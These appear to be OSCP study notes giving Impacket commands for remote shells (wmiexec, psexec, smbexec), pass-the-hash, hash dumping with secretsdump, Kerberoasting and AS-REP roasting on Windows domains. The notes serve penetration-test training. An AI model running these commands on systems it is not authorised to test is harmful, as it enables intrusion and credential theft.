
# Impacket — Remote Execution Suite (OSCP)

## **When You Use Impacket**
Impacket is used for RCE after you have verified with CME that there are valid creds for said service, and would like to use this as a foothold on your windows machine.
  

You use Impacket **after enumeration**, when you have **at least one** of:

- Username + password
- Username + NTLM hash
- Domain name
- Domain controller IP

Impacket is usually **STEP 5+** in the workflow.


## **wmiexec.py (Preferred)**
### **When to Use**

- Valid username + password or NTLM hash
- SMB reachable
- Want a stable shell without dropping files
### **command**
```bash
wmiexec.py user:password@TARGET_IP
```

or impacket if still running an old version
```bash
impacket-wmiexec
impacket-psexec
```
you can check by:
```bash
which wmiexec.py
```

Pass-the-hash:
```bash
wmiexec.py user@TARGET_IP -hashes :NTLM_HASH
```
### **What You Get**

- Semi-interactive CMD shell
- Often runs as **Administrator**
- No service creation
- Less noisy than psexec






## **psexec.py (Loud but Reliable)**
### **When to Use**

- wmiexec fails
- You want guaranteed SYSTEM
- Noise doesn’t matter
### **Command**
```bash
psexec.py user:password@TARGET_IP
#
```

Pass-the-hash:
```bash
psexec.py user@TARGET_IP -hashes :NTLM_HASH
```

### **What You Get**
- Full SYSTEM shell
- Creates a service on the target
- Very reliable


## **smbexec.py (Fallback Option)**
### **When to Use**
- psexec blocked
- wmiexec unstable

```bash
smbexec.py user:password@TARGET_IP
```
### **Notes**

- Less clean shell
- Still useful for command execution


## **secretsdump.py — Dump Hashes**
### **When to Use**

- SYSTEM shell
- Admin credentials
### **Remote dump**
```bash
secretsdump.py user:password@TARGET_IP
```

### **Local dump**
```bash
secretsdump.py -sam sam -system system LOCAL
```

### **Output**

- NTLM hashes
- Cached credentials
- Domain secrets



## **GetUserSPNs.py — Kerberoasting**
### **When to Use**
- Domain user creds
- Domain controller reachable

```bash
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
```
### **Output**
- Kerberos hashes
- Crack offline with Hashcat

## **GetNPUsers.py — AS-REP Roasting**
### **When to Use**

- Usernames only
- Pre-auth disabled accounts
### **Command**
```bash
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP
```

### **Output**
- AS-REP hashes for cracking



## **Related Notes**

- [[CrackMapExec]]
- [[NetExec]]
- [[Hashcat]]
- [[Mimikatz]]
- [[Password_Spraying]]
